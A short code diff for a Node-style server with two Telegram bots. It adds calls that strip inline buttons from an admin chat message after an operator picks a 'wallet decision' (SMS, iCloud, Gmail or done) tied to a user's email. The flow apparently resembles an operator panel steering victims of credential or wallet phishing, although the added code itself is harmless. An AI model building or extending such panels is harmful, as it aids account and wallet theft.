@@ -665,6 +665,20 @@ if (bot2) {
         const email = identifier;
 
         try {
+          // ✅ REMOVE BUTTONS from message
+          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN_2}/editMessageReplyMarkup`;
+          await fetch(editUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID_2,
+              message_id: query.message?.message_id,
+              reply_markup: JSON.stringify({ inline_keyboard: [] })
+            })
+          });
+        } catch (err) {}
+
+        try {
           await fetch(`${APP_URL}/update-wallet-decision`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -903,6 +917,20 @@ if (bot2) {
 
       if (action === "wallet_decision_sms" || action === "wallet_decision_done" || action === "wallet_decision_icloud" || action === "wallet_decision_gmail") {
         const email = identifier;
+
+        try {
+          // ✅ REMOVE BUTTONS from message
+          const editUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`;
+          await fetch(editUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: ADMIN_CHAT_ID,
+              message_id: query.message?.message_id,
+              reply_markup: JSON.stringify({ inline_keyboard: [] })
+            })
+          });
+        } catch (err) {}
 
         try {
           await fetch(`${APP_URL}/update-wallet-decision`, {
